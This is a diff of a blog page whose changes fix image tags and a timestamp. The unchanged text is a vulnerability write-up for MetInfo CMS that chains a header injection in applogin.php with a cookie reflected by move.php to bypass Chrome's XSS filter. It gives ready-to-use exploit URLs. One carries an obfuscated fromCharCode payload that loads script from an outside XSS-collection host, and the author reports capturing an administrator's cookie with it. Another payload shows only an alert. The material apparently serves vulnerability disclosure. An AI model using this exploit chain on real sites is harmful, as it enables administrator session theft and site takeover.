@@ -363,7 +363,7 @@
                 
               
 
-              <time title="Created: 2018-12-04 17:47:07 / Modified: 17:52:38" itemprop="dateCreated datePublished" datetime="2018-12-04T17:47:07+08:00">2018-12-04</time>
+              <time title="Created: 2018-12-04 17:47:07 / Modified: 17:55:37" itemprop="dateCreated datePublished" datetime="2018-12-04T17:47:07+08:00">2018-12-04</time>
             
 
             
@@ -447,14 +447,14 @@
 <p>so here we can communicate this vul with vul1 to bypass chrome’s xss filter,because chrome’s xss filter donnot check  data from user’s cookie. </p>
 <h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>Let administrator visit this address</p>
 <p><code>http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253cimg%20src%3dasd%20onerror%3deval(String.fromCharCode(118,97,114,32,120,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,120,46,115,114,99,61,34,47,47,120,115,115,112,116,46,99,111,109,47,80,87,87,50,65,105,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,120,41,59))%3E;path=/</code></p>
-<p>we can see an responce header is set。<br><img src="![responce_headers.png](https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/responce_headers.png?raw=true" alt=""></p>
+<p>we can see an responce header is set。<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/responce_headers.png?raw=true" alt="responce_headers.png"></p>
 <h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>let the administrator visit </p>
 <p><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code></p>
-<p>here we can see the data in user’s cookie is shown in the dom<br><img src="![dom_loaded.png](https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/dom_loaded.png?raw=true" alt=""></p>
-<p>in my xss platform(platform to recieve xss data),we can see cookie of the manager is captured.<br><img src="![xss_back.png](https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/xss_back.png?raw=true" alt=""></p>
+<p>here we can see the data in user’s cookie is shown in the dom<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/dom_loaded.png?raw=true" alt="dom_loaded.png"></p>
+<p>in my xss platform(platform to recieve xss data),we can see cookie of the manager is captured.<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/xss_back.png?raw=true" alt="xss_back.png"></p>
 <h3 id="just-want-an-alert"><a href="#just-want-an-alert" class="headerlink" title="just want an alert?"></a>just want an alert?</h3><p>first visit</p>
 <p><code>http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253csvg/onload%3dalert(1)%3E;path=/</code></p>
-<p>secondly<br><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code><br>now you can see an alert<br><img src="![alert.png](https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/alert.png?raw=true" alt=""></p>
+<p>secondly<br><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code><br>now you can see an alert<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/alert.png?raw=true" alt="alert.png"></p>
 
           
         
